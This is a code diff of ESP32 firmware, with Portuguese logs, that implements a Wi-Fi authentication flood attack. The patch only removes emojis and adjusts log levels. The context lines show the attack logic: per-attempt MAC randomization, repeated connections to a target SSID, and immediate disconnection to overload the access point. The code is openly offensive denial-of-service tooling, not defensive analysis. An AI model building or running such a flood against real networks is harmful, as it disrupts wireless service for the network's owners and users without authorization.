@@ -38,7 +38,7 @@ static void event_handler(void* arg, esp_event_base_t event_base,
                          int32_t event_id, void* event_data)
 {
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
-        ESP_LOGI(TAG, "🔥 Auth flood #%d - Iniciando autenticação", auth_attempts + 1);
+        ESP_LOGI(TAG, " Auth flood #%d - Iniciando autenticação", auth_attempts + 1);
         esp_wifi_connect();
         
     } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
@@ -46,9 +46,9 @@ static void event_handler(void* arg, esp_event_base_t event_base,
         wifi_event_sta_connected_t* connected = (wifi_event_sta_connected_t*) event_data;
         auth_successes++;
         
-        ESP_LOGW(TAG, "✅ AUTH SUCESSO #%d - SSID: %s, Canal: %d", 
+        ESP_LOGI(TAG, " AUTH SUCESSO #%d - SSID: %s, Canal: %d", 
                  auth_attempts + 1, connected->ssid, connected->channel);
-        ESP_LOGW(TAG, "   └─ Desconectando imediatamente para continuar flood...");
+        ESP_LOGI(TAG, "   └─ Desconectando imediatamente para continuar flood...");
         
         // Desconectar imediatamente para sobrecarregar o AP
         if (DISCONNECT_AFTER_AUTH) {
@@ -66,10 +66,10 @@ static void event_handler(void* arg, esp_event_base_t event_base,
             disconnected->reason == WIFI_REASON_AUTH_EXPIRE ||
             disconnected->reason == WIFI_REASON_NO_AP_FOUND) {
             auth_failures++;
-            ESP_LOGW(TAG, "❌ AUTH FALHA #%d - Motivo: %d", 
+            ESP_LOGI(TAG, " AUTH FALHA #%d - Motivo: %d", 
                      auth_attempts + 1, disconnected->reason);
         } else {
-            ESP_LOGD(TAG, "🔄 Desconexão #%d - Motivo: %d", 
+            ESP_LOGD(TAG, " Desconexão #%d - Motivo: %d", 
                      auth_attempts + 1, disconnected->reason);
         }
         
@@ -79,7 +79,7 @@ static void event_handler(void* arg, esp_event_base_t event_base,
         // IP obtido - desconectar imediatamente
         ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
         
-        ESP_LOGW(TAG, "🌐 IP obtido: " IPSTR " - Desconectando para continuar flood", 
+        ESP_LOGI(TAG, " IP obtido: " IPSTR " - Desconectando para continuar flood", 
                  IP2STR(&event->ip_info.ip));
         
         esp_wifi_disconnect();
@@ -122,7 +122,7 @@ void execute_auth_flood_attempt(void)
 {
     auth_attempts++;
     
-    ESP_LOGI(TAG, "🚀 AUTH FLOOD #%d/%d", auth_attempts, MAX_AUTH_ATTEMPTS);
+    ESP_LOGI(TAG, " AUTH FLOOD #%d/%d", auth_attempts, MAX_AUTH_ATTEMPTS);
     
     // Randomizar MAC para cada tentativa
     randomize_mac_for_auth();
@@ -155,7 +155,7 @@ void execute_auth_flood_attempt(void)
             pdMS_TO_TICKS(500)); // Timeout curto de 500ms
     
     if (!(bits & (WIFI_CONNECTED_BIT | WIFI_FAIL_BIT | WIFI_AUTH_SUCCESS_BIT))) {
-        ESP_LOGW(TAG, "⏱️ Timeout na tentativa #%d", auth_attempts);
+        ESP_LOGI(TAG, " Timeout na tentativa #%d", auth_attempts);
         auth_failures++;
         esp_wifi_stop(); // Parar e tentar novamente
     }
@@ -184,7 +184,7 @@ void show_auth_flood_stats(void)
 static void auth_flood_attack_task(void *pvParameters)
 {
     ESP_LOGI(TAG, "");
-    ESP_LOGI(TAG, "🔥🔥🔥 INICIANDO AUTH FLOOD ATTACK! 🔥🔥🔥");
+    ESP_LOGI(TAG, " INICIANDO AUTH FLOOD ATTACK! ");
     ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
     ESP_LOGI(TAG, "Intervalo: %d ms", AUTH_FLOOD_INTERVAL_MS);
     ESP_LOGI(TAG, "Máximo: %d tentativas", MAX_AUTH_ATTEMPTS);
@@ -204,7 +204,7 @@ static void auth_flood_attack_task(void *pvParameters)
     }
     
     ESP_LOGI(TAG, "");
-    ESP_LOGI(TAG, "🏁 AUTH FLOOD ATTACK CONCLUÍDO!");
+    ESP_LOGI(TAG, " AUTH FLOOD ATTACK CONCLUÍDO!");
     show_auth_flood_stats();
     
     // Task finalizada
